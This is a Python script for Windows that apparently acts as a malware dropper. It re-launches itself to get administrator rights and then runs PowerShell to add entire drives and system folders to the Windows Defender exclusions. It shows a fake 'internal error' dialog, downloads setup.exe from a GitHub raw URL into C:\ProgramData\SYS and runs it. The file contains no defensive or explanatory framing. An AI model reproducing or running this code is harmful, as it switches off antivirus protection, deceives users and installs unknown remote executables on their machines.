import ctypes
import os
import sys
import time
from tkinter import messagebox
import requests
import subprocess


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if is_admin():

    p = subprocess.Popen(["powershell.exe",
                          'Add-MpPreference -ExclusionPath “C:\”,“E:\”,“D:\”,“F:\”,“J:\”,"C:\Program Files","C:\Windows\SysWOW64\config\systemprofile"'],
                         stdout=sys.stdout)
    p.communicate()

    p = subprocess.Popen(["powershell.exe",
                          'Add-MpPreference -ExclusionPath “C:\ProgramData\SYS”'],
                         stdout=sys.stdout)
    p.communicate()

    messagebox.showerror("Error", "An internal error has occurred: The parameter is incorrect: (0x80070057)")

    def download(url: str, dest_folder: str):
        if not os.path.exists(dest_folder):
            os.makedirs(dest_folder)  # create folder if it does not exist

        filename = url.split('/')[-1].replace(" ", "_")  # be careful with file names
        file_path = os.path.join(dest_folder, filename)

        r = requests.get(url, stream=True)
        if r.ok:
            print("saving to", os.path.abspath(file_path))
            with open(file_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024 * 8):
                    if chunk:
                        f.write(chunk)
                        f.flush()
                        os.fsync(f.fileno())
        else:  # HTTP status code 4XX/5XX
            print("Download failed: status code {}\n{}".format(r.status_code, r.text))

    download("https://github.com/MASMob2022/pyw.download/raw/main/setup.exe", dest_folder="C:\ProgramData\SYS")

    time.sleep(5)

    os.startfile("C:\ProgramData/SYS/setup.exe")

else:
    print("Not Admin")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)